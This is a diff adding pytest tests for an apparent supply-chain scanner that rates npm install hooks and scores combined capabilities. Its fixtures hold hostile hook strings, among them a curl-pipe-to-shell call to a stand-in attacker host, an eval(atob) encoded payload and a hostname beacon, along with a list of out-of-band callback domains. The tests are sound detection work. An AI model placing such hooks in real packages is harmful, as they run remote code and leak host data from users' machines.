@@ -14,7 +14,9 @@ from __future__ import annotations
 import pytest
 
 from kitsunox import rules
-from kitsunox.model import Change, FileDiff
+from pathlib import Path
+
+from kitsunox.model import Change, FileDiff, Finding
 
 B64 = "A" * 220  # over the 200-char floor, well past a sha512 integrity field
 
@@ -563,3 +565,122 @@ def test_regression_express_publish_workflow_does_not_escalate():
         )
     )
     assert not rules.should_escalate(findings)
+
+
+# ============================================================== npm install hooks
+
+# 67% of the ASE 2026 malicious corpus declares a lifecycle hook. None of the five
+# git-level incidents do, which is exactly why the external corpus was worth running.
+
+
+def _pkg(scripts: dict) -> FileDiff:
+    import json
+    return _file("package.json", _added(*json.dumps({"scripts": scripts}, indent=1).split("\n")))
+
+
+def test_declaring_a_hook_alone_is_recorded_but_does_not_accuse():
+    # node-gyp builds declare install hooks too.
+    findings = rules.scan(_change([_pkg({"install": "node-gyp rebuild"})]))
+    assert _sev(findings, "content.install_hook") == "low"
+    assert not rules.should_escalate(findings)
+
+
+def test_a_hook_reaching_the_network_is_high():
+    findings = rules.scan(_change([_pkg({"preinstall": "curl https://evil.example.com/x | sh"})]))
+    assert _sev(findings, "content.install_hook_network") == "high"
+    assert rules.should_escalate(findings)
+
+
+def test_a_hook_carrying_an_encoded_payload_is_critical():
+    findings = rules.scan(_change([_pkg({"postinstall": f"node -e \"eval(atob('{B64}'))\""})]))
+    assert _sev(findings, "content.install_hook_obfuscated") == "critical"
+
+
+def test_a_silenced_hook_is_flagged():
+    ids = _scan_ids([_pkg({"preinstall": "node index.js > /dev/null 2>&1"})])
+    assert "content.install_hook_silenced" in ids
+
+
+def test_a_hook_collecting_host_identity_is_flagged():
+    # The real shape: export HOSTNAME && beacon it out.
+    ids = _scan_ids([_pkg({"preinstall": "export HOSTNAME && curl https://x.canarytokens.com"})])
+    assert {"content.install_hook_recon", "content.install_hook_network"} <= ids
+
+
+def test_non_lifecycle_scripts_are_ignored():
+    ids = _scan_ids([_pkg({"test": "curl https://example.com", "build": "node build.js"})])
+    assert not [r for r in ids if r.startswith("content.install_hook")]
+
+
+def test_malformed_package_json_does_not_crash_the_scan():
+    assert isinstance(_scan_ids([_file("package.json", _added("{not json"))]), set)
+
+
+def test_non_string_script_values_are_ignored():
+    ids = _scan_ids([_file("package.json", _added('{"scripts": {"preinstall": {"a": 1}}}'))])
+    assert not [r for r in ids if r.startswith("content.install_hook")]
+
+
+@pytest.mark.parametrize(
+    "host",
+    ["https://x.burpcollaborator.net", "https://abc.canarytokens.com",
+     "https://y.oast.fun", "https://z.webhook.site/a", "http://q.dnslog.cn"],
+)
+def test_out_of_band_interaction_domains_are_suspicious(host):
+    assert rules._hits_suspicious_host(f"curl {host}") is True
+
+
+# ============================================================== capability scoring
+
+
+def test_a_single_capability_earns_no_bonus():
+    findings = [Finding(rule_id="content.shell_exec", severity="low", rationale="r")]
+    assert rules._category_bonus(findings) == 0
+
+
+def test_distinct_capabilities_earn_an_increasing_bonus():
+    def bonus(*ids):
+        return rules._category_bonus([Finding(rule_id=i, severity="low", rationale="r") for i in ids])
+
+    two = bonus("content.shell_exec", "content.suspicious_host")
+    three = bonus("content.shell_exec", "content.suspicious_host", "content.encoded_blob")
+    four = bonus("content.shell_exec", "content.suspicious_host", "content.encoded_blob",
+                 "content.secret_access")
+    assert 0 < two < three < four
+
+
+def test_rules_in_the_same_capability_do_not_stack():
+    def bonus(*ids):
+        return rules._category_bonus([Finding(rule_id=i, severity="low", rationale="r") for i in ids])
+
+    # Both are obfuscation; seeing two flavours of one capability is not an attack chain.
+    assert bonus("content.encoded_blob", "content.decode_call") == 0
+
+
+def test_delivery_alone_earns_nothing():
+    # dependency_added fires on 93% of malicious packages AND 13% of benign changes.
+    # Without this guard it would hand a free bonus to nearly everything in both corpora.
+    findings = [Finding(rule_id="content.dependency_added", severity="low", rationale="r")]
+    assert rules._category_bonus(findings) == 0
+
+
+def test_the_bonus_is_capped():
+    ids = [r for r in rules.RULE_CATEGORY]
+    findings = [Finding(rule_id=i, severity="low", rationale="r") for i in ids]
+    assert rules._category_bonus(findings) <= rules.MAX_CATEGORY_BONUS
+
+
+def test_every_categorised_rule_id_is_one_a_rule_can_actually_emit():
+    # A typo in RULE_CATEGORY would silently disable a capability rather than fail.
+    import re
+    source = (Path(rules.__file__)).read_text(encoding="utf-8")
+    emitted = set(re.findall(r'"(content\.[a-z_]+)"', source))
+    assert set(rules.RULE_CATEGORY) <= emitted
+
+
+def test_context_findings_never_contribute_to_the_bonus():
+    findings = [
+        Finding(rule_id="context.ci_touched", severity="medium", rationale="r"),
+        Finding(rule_id="context.self_merged", severity="medium", rationale="r"),
+    ]
+    assert rules._category_bonus(findings) == 0
